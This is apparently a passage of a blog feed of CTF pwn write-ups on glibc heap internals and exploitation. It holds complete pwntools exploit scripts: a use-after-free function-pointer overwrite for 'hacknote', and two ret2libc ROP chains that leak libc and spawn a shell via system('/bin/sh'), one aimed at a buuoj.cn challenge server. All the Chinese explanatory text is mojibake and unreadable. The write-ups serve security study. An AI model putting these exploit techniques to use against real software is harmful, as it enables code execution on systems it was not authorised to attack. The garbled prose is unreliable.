mhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}"></div><script type="text/javascript" src="https://app.diagrams.net/js/viewer-static.min.js"></script><p>chunk Aæ˜¯ç”³è¯·çš„<code>note[0]</code>ç»“æ„ä½“çš„ç©ºé—´ï¼Œchunk Bæ˜¯<code>note[0]-&gt;content</code>çš„ç©ºé—´</p><p>chunk Cã€Dæ˜¯<code>note[1]</code>çš„ç©ºé—´</p><p>ç”±äºfastbinä¼šæŠŠåŒæ ·å¤§å°çš„å—æ”¾åœ¨åŒä¸€ä¸ªé“¾è¡¨ä¸Šï¼Œå› æ­¤ä¸¤ä¸ª0x8å¤§å°çš„chunk Aã€ chunk Cä¼šè¢«è¿åœ¨ä¸€èµ·ï¼Œå¹¶ä¸”ç”±äºfastbinä½¿ç”¨çš„æ˜¯å…ˆè¿›åå‡ºçš„å•å‘é“¾è¡¨ï¼ŒAåœ¨Cä¸‹é¢ã€‚</p><p>å½“ç”³è¯·ä¸€ä¸ªcontentå¤§å°ä¸º0x8çš„æ–°çš„noteæ—¶ï¼Œä¼šå°†Aå’ŒCä»fastbinä¸­å–å‡ºã€‚å…ˆmallocç»“æ„ä½“æœ¬èº«ï¼Œä½¿ç”¨chunk Cï¼Œç„¶åmalloc contentï¼Œä½¿ç”¨chunk Aã€‚</p><p>å› æ­¤<code>add(0x8,p32(magic))</code>ä¼šæŠŠmagicåœ°å€å†™å…¥contentï¼Œè°ƒç”¨showçš„æ—¶å€™ï¼Œä¼šç›´æ¥æ‰§è¡Œè¿™ä¸ªå‡½æ•°ã€‚</p><p>ç†è®ºæ˜¯å¦‚æ­¤ï¼Œä¸‹é¢ç”¨gdbéªŒè¯ä¸€ä¸‹</p><h4 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h4><p>å®Œæ•´expï¼Œåœ¨ä¸¤æ¬¡addã€ä¸¤æ¬¡deleteã€æœ€åä¸€æ¬¡addä¹‹ååˆ†åˆ«attachæŸ¥çœ‹notelist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class="hljs-string">&#x27;./hacknote&#x27;</span>)<br>menu = <span class="hljs-string">&#x27;Your choice :&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>dbg()<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>dbg()<br>magic = <span class="hljs-number">0x08048986</span><br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>dbg()<br>show(<span class="hljs-number">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>åœ¨idaä¸­å¯ä»¥çœ‹åˆ°notelistçš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40â†‘r<br>.bss:0804A070                                         ; add_note+61â†‘w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¸‰æ¬¡notelistçš„å†…å®¹ï¼Œ</p><p><img src="/img/UAF/1.jpg"></p><p><img src="/img/UAF/2.jpg"></p><p><img src="/img/UAF/3.jpg"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>0x92f31a0</code>ä¸Šçš„åœ°å€ä¸ºprint_noteå‡½æ•°çš„åœ°å€ï¼Œåœ¨freeä¹‹å‰ï¼Œ<code>0x92f31a4</code>ä¸Šçš„å†…å®¹æŒ‡å‘ä¸‹ä¸€è¡Œå¼€å¤´ï¼Œå³<code>aaaa</code>å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œå°±æ˜¯note[0]ã€‚</p><p>åœ¨ç¬¬ä¸‰æ¬¡addä¹‹åæ”¹å˜äº†note[0]åŸæœ¬åœ¨print_noteä¸Šçš„å‡½æ•°æŒ‡é’ˆï¼Œå› æ­¤show(0)æ—¶ä¼šæ‰§è¡Œmagic</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heap Exploitation</title>
    <link href="/2022/11/18/ctf-pwn/heap%20exploitation/"/>
    <url>/2022/11/18/ctf-pwn/heap%20exploitation/</url>
    
    <content type="html"><![CDATA[<h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span></span>;<br></code></pre></td></tr></table></figure><p>size = 0æ—¶ï¼Œè¿”å›ç³»ç»Ÿå…è®¸çš„æœ€å°å†…å­˜å—</p><p>32ä½ç³»ç»Ÿä¸‹malloc(0)åˆ†é…8Bytesï¼Œ64ä½åˆ†é…16Bytes</p><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>å †æ®µçš„èµ·ç‚¹å’Œç»ˆç‚¹æ ‡è¯†ç¬¦ï¼šstart_brkã€brkï¼ˆprogram brk)</p><p>ä¸å¼€ASLRï¼Œåˆå§‹æ—¶éƒ½æŒ‡å‘bssæ®µæœ«å°¾ï¼ˆend_data)</p><p>å¼€å¯ASLRï¼Œä¼šéšæœºå‘ååç§»ä¸€æ®µè·ç¦»</p><p><code>brk()</code>å‡½æ•°ä½œç”¨ä¸ºæŠ¬é«˜brkæŒ‡é’ˆï¼Œè·å–ä¸€æ®µheap</p><p>ç¨‹åºå¼€å§‹æ—¶heapå¤§å°ä¸º0ï¼Œç¬¬ä¸€æ¬¡ç”³è¯·å †çš„æ—¶å€™ï¼Œé€šè¿‡brk()å‘ç³»ç»Ÿç”³è¯·ä¸€æ®µå†…å­˜  <strong>main_arena</strong>ï¼Œåé¢mallocéƒ½ä¼šä»main_arenaä¸­ç”³è¯·å†…å­˜</p><h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>&#123;</span><br>    INTERNAL_SIZE_T mchunk_prev_size; <span class="hljs-comment">/* Size of previous chunk (if free).*/</span><br>    INTERNAL_SIZE_T mchunk_size;      <span class="hljs-comment">/* Size in bytesï¼Œincluding overhead.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">fd</span>;</span>          <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk</span>;</span>          <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free.*/</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc</span> <span class="hljs-title">chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">mchunkptr</span>;</span><br></code></pre></td></tr></table></figure><h4 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h4><p><code>prevsize </code>ï¼šå¦‚æœå‰ä¸€ä¸ªchunkæ˜¯freeçš„<em><strong>ï¼ˆè¿™é‡ŒæŒ‡çš„æ˜¯å†…å­˜ä¸­çš„å‰ä¸€ä¸ªï¼Œè€Œä¸æ˜¯freelistä¸­çš„å‰ä¸€ä¸ªï¼‰</strong></em>ï¼Œå®ƒä»£è¡¨å‰ä¸€ä¸ªchunkçš„å¤§å°ï¼›å¦‚æœä¸æ˜¯freeçš„ï¼Œå­˜å‚¨å‰ä¸€ä¸ªçš„user data ã€‚32ä½ä¸­æ˜¯4å­—èŠ‚ï¼Œ64ä½ä¸­æ˜¯8å­—èŠ‚</p><p><code>size</code>ï¼šæ­¤chunkå¤§å°ã€‚æœ€ä½3ä½ç”¨æ¥å­˜å‚¨Nï¼ˆchunk åœ¨ non_main_arenaé‡Œä¸º1ï¼‰ã€Mï¼ˆchunkæ˜¯mmapå¾—åˆ°çš„ä¸º1ï¼‰ã€Pï¼ˆå‰ä¸€ä¸ªchunkå·²è¢«åˆ†é…ä¸º1 å¯¹åº”prevsizeï¼‰ï¼Œå› æ­¤sizeæ˜¯8å­—èŠ‚å¯¹é½çš„</p><p><code>userdata</code>ï¼šæ•°æ®</p><p>ï¼ˆä¸‹ä¸€ä¸ªchunkçš„prevsizeä¹Ÿä¼šå­˜å‚¨userdataï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> request2size(req) ...   <span class="hljs-comment">//å¯ä»¥è®¡ç®—ç”³è¯·å­—èŠ‚éœ€è¦å®é™…åˆ†é…å¤šå°‘å­—èŠ‚</span></span><br></code></pre></td></tr></table></figure><p>chunkæ˜¯åœ¨prevsizeå¼€å§‹ï¼Œä½†æ˜¯mallocè¿”å›çš„æŒ‡é’ˆæŒ‡å‘userdata</p><h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p><code>prevsize</code>ï¼šä¸Šä¸€ä¸ªchunkçš„userdataï¼Œå› ä¸ºä¸Šä¸€ä¸ªå¦‚æœä¹Ÿæ˜¯freeï¼Œåˆ™ä¼šè¢«åˆå¹¶ï¼ˆfast binä¸­å¯èƒ½ä¼šä¾‹å¤–ï¼Œåé¢ä¼šæåŠï¼‰</p><p><code>size</code>ï¼šåŒä¸Š</p><p><code>fd bk</code>ï¼šï¼ˆåœ¨freelistä¸­çš„ï¼‰å‰ä¸€ä¸ª/åä¸€ä¸ªchunk</p><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>ä½äºarenaé¡¶éƒ¨ã€‚åœ¨æ‰€æœ‰binéƒ½æ²¡æœ‰æ»¡è¶³éœ€æ±‚çš„chunkæ—¶ï¼Œä»top chunkåˆ‡å‰²</p><p>top chunk ä¸å¤Ÿï¼Œåœ¨main_arenaä¸­ä¼šç”¨brkæ‰©å¼ top chunkï¼Œnon_main_arenaä¸­ï¼Œç”¨mmapåˆ†é…æ–°çš„å †</p><h3 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h3><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;toolbar&quot;:&quot;zoom layers tags lightbox&quot;,&quot;edit&quot;:&quot;_blank&quot;,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-17T04:09:19.532Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;ojfzveORWWdzC3RN6ooc\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;FyZdLwTWtfESSsWo7Yml\&quot; name=\&quot;ç¬¬ 1 é¡µ\&quot;&gt;7ZlNc5swEIZ/jY/JgASCHOPEaQ7pNDNups0poxoF6GCJCvmrv74rIwyCEieeSUybnMyupEV6tK9YwwhfzNefJM2TzyJi2Qg50XqEL0cIuTg8gx/t2RiPEzilJ5ZpVPoajmn6m1UdjXeRRqwwvtKlhMhUmtvOmeCczZTlo1KKld3tUWSR5chpzKxpaMd0RjPW6fYtjVRSekMU1P5rlsZJdWeXmBXPadXZBC4SGolVw4UnI3whhVDl1Xx9wTJNz+Zy1dO6m5hkXD1nwPVEnE/c5bn/8JD9ouvwhn+5OzFRljRbmAV/FYrqYeOUFyNEMog9/iHhKtZXLiZmNWpTIZJiwSOm7+JAj1WSKjbN6Uy3riArwJeoeQaWC5ePgiuzyy4B29yfScXWvQtzd7gg0ZiYMyU30MUMQBVyk2MnQVjaq3rDXGJ2IWlsVmh81ORIvAtdY4QLQ/IFVHGH6hUtVD9UZ3BMXddCivzgyEi9DtI7XghYYdSPdXBUEQkGhtXvYL2hEk7EPqYEDw6qj52BQSUdqNM5zfoPVYIGBzVonanHhxp0oPaoHg3vCdVO0QAdGeZZB2aHGYugDjImFxx+xnDcJiIWnGY3QuQG10+m1MbwogslbJg2+SZawDVmPDrXNRrYImccPIWictfFK7s0zUIs5IzdMpkCCCb1LqY8htYQGpU+ulRP42whl9uJ6Gmxdaq+60mdIt+Y942my7WZ8NbYVAYH9OUovzLvm231sK1VjSvRap5Ppw/g365uf7lWLnRfAdJNx2a+eSa3JMuoSpf23P6WcCbcrUi5qlMbO61KISR2CLNj5ahmedoK5Hl7ApndbQeCBKKbRrdcdyg6CtlROFw0VZn2flVzoAAqtbkNqUGIwH9abmDsZnU8KQUfUnoFKXX/d74zKf2jD6Dgmarx3kw17drKdfCBqsF2yYvdVqDjqwZ9qEY18v9/E43/ZqJBDrJyvXov8VLNuO33REEr0PE1030X9141ExwkGo80VXPinML5uqfc09YrVm7PlRN5MzkR1HoGVW90Xqongj1bT21hvqKewKw/RpTd6286ePIH&lt;/diagram&gt;&lt;/mxfile&gt;&quot;}"></div><script type="text/javascript" src="https://viewer.diagrams.net/js/viewer-static.min.js"></script><h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>åœ¨freeä¸€ä¸ªchunkåˆ°fast binæ—¶ï¼Œå®ƒä¸‹ä¸€ä¸ªchunkçš„Pä½ï¼ˆPREV_INUSE)æ˜¯ä¸ä¼šå˜çš„ï¼Œè¿˜æ˜¯ä¸º1ï¼Œä¸ºäº†åŠ å¿«freeçš„æ•ˆç‡ã€‚<strong>å› æ­¤åœ°å€è¿ç»­çš„ä¸¤ä¸ªchunk è¢«freeåˆ°fast binï¼Œä»–ä»¬ä¸ä¼šè¢«åˆå¹¶</strong>ã€‚</p><p>å¤§å°èŒƒå›´ï¼š0x10-0x40 ï¼ˆ64ä½ä¸­0x20-0x80ï¼‰æ¯ä¸€ä¸ªé“¾è¡¨ä¸­å­˜æ”¾çš„chunkå¤§å°ç›¸åŒï¼Œç›¸é‚»binå­˜æ”¾çš„å¤§å°å·®0x8ï¼ˆ0x10ï¼‰å­—èŠ‚</p><p>æ–°çš„chunkåŠ å…¥binæ—¶ï¼Œ<strong>fd</strong>æŒ‡å‘åŸæ¥çš„æ ˆé¡¶</p><h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><p>å¤§äºglobal_max_fastï¼ˆfast binæœ€å¤§å¤§å°ï¼‰çš„chunkéƒ½ä¼šæ”¾è¿›æ¥</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>å­˜æ”¾å°äº0x200ï¼ˆ0x400ï¼‰çš„ï¼Œä¹Ÿå°±æ˜¯0x10-0x1f0ï¼ˆ0x20-0x3f0ï¼‰chunkï¼Œå’Œfast binç›¸åŒï¼Œæ¯ä¸ªbinå¤§å°é€’å¢ï¼Œå› æ­¤æœ‰62ä¸ªsmall bin</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><p>å¤§äº0x200ï¼ˆ0x400ï¼‰ï¼Œæ¯ä¸€ä¸ªbinä¸­chunkå¤§å°ä¸æ˜¯ç›¸åŒçš„ï¼ŒæŒ‰ç…§å¤§å°é™åºæ’åˆ—</p><h3 id="å†…å­˜åˆ†é…æµç¨‹"><a href="#å†…å­˜åˆ†é…æµç¨‹" class="headerlink" title="å†…å­˜åˆ†é…æµç¨‹"></a>å†…å­˜åˆ†é…æµç¨‹</h3><p> <img src="/img/heapexploitation/1.jpg"></p><h3 id="å†…å­˜é‡Šæ”¾æµç¨‹"><a href="#å†…å­˜é‡Šæ”¾æµç¨‹" class="headerlink" title="å†…å­˜é‡Šæ”¾æµç¨‹"></a>å†…å­˜é‡Šæ”¾æµç¨‹</h3><p> <img src="/img/heapexploitation/2.jpg"></p><p><a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">Understanding glibc malloc</a></p><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">Syscalls used by malloc</a></p><p><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">glibc å†…å­˜ç®¡ç† ptmalloc æºä»£ç åˆ†æ</a></p><p><a href="https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/">Painless intro to the Linux userland heap</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP ciscn_2019_c_1</title>
    <link href="/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/"/>
    <url>/2022/11/16/ctf-pwn/ROP%20ciscn_2019_c_1/</url>
    
    <content type="html"><![CDATA[<p><strong>é¢˜ç›®</strong></p><p><a href="https://buuoj.cn/challenges#ciscn_2019_c_1">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class="hljs-string">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class="hljs-number">0x4006b9</span><br>rdi=<span class="hljs-number">0x400c83</span><br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment">#ç¬¬ä¸€æ¬¡æ”»å‡»ç»•è¿‡å‡½æ•°</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()<span class="hljs-comment">#æ¥æ”¶å­—ç¬¦ä¸²Ciphertext</span><br>p.recvline()    <span class="hljs-comment">#åŠ å¯†åçš„å¯†æ–‡</span><br><span class="hljs-comment">#è¿™é‡Œæ³¨æ„éœ€è¦æ¥æ”¶2æ¬¡</span><br> <br>puts_addr=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))  <span class="hljs-comment">#å¾—åˆ° puts å‡½æ•° çš„åœ°å€</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,puts_addr) <span class="hljs-comment">#è·å–libcçš„ç‰ˆæœ¬</span><br>offset=puts_addr-libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>) <span class="hljs-comment">#è®¡ç®—åç§»é‡</span><br>binsh=offset+libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>) <span class="hljs-comment">#è®¡ç®—å­—ç¬¦ä¸²&quot;/bin/sh&quot;çš„åœ°å€</span><br>system=offset+libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>) <span class="hljs-comment">#è®¡ç®—å‡½æ•°systemçš„åœ°å€</span><br> <br><span class="hljs-comment">#ç¬¬äºŒæ¬¡æ”»å‡»getshell</span><br> <br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your choice!\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)     <span class="hljs-comment">#   å†ä¸€æ¬¡æ‰§è¡Œ ä¸€éæµç¨‹</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class="hljs-comment"># ubuntu18ç‰ˆæœ¬ä»¥ä¸Šè°ƒç”¨64ä½ç¨‹åºä¸­çš„systemå‡½æ•°çš„æ ˆå¯¹é½é—®é¢˜</span><br><span class="hljs-comment"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HarekazeCTF2019 baby_rop</title>
    <link href="/2022/11/16/ctf-pwn/HarekazeCTF2019baby_rop/"/>
    <url>/2022/11/16/ctf-pwn/HarekazeCTF2019baby_rop/</url>
    
    <content type="html"><![CDATA[<p><strong>é¢˜ç›®</strong></p><p><a href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop</a></p><p>ä»ç»™å®šlibcè·å–è·å–åŸºå€</p><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28818</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-comment">#payload 1</span><br>payload1 = <span class="hljs-string">&#x27;\x00&#x27;</span> + <span class="hljs-string">&#x27;\xff&#x27;</span> * <span class="hljs-number">7</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-comment">#payload 2</span><br>payload2 = (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(e.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">0x08048825</span>) +p32(<span class="hljs-number">1</span>) + p32(e.got[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(<span class="hljs-number">4</span>)<br><br>p.sendline(payload2)<br><br><span class="hljs-comment"># leak addr</span><br>write_got = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_got))<br><br><span class="hljs-comment">#payload 3</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libc.address =  write_got - libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>p.sendline(payload1)<br>payload3 =  (<span class="hljs-number">231</span> + <span class="hljs-number">4</span>) * <span class="hljs-string">b&#x27;a&#x27;</span> + p32(system) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GOTè¡¨å’ŒPLTè¡¨</title>
    <link href="/2022/11/16/ctf-pwn/got%E8%A1%A8%E5%92%8Cplt%E8%A1%A8/"/>
